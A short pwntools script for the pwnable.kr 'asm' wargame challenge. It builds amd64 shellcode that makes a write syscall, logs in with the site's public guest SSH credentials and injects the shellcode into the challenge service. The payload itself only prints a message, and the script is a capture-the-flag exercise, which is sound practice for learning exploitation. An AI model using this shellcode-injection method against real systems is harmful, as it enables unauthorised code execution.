#!/bin/python3
from pwn import *
context.arch = "amd64"
stub_len = 45

msg_addr = 0x41414000
asm_code = f"""
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

add rax, 1       
add rdi, 1       
add rsi, {msg_addr}     
add rdx, 10  
syscall          
        
"""

shell_code = asm(asm_code)
msg_addr = msg_addr + stub_len + len(shell_code)
asm_code = f"""
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

add rax, 1       
add rdi, 1       
add rsi, {msg_addr}     
add rdx, 10  
syscall          
        
"""
shell_code = asm(asm_code)
print(shell_code)
print(b'\x00' in shell_code)

s = ssh(host="pwnable.kr", user="asm", port=2222, password="guest")
io = s.remote('0', 9026)
io.sendline(shell_code + b'hello my world')
io.interactive()
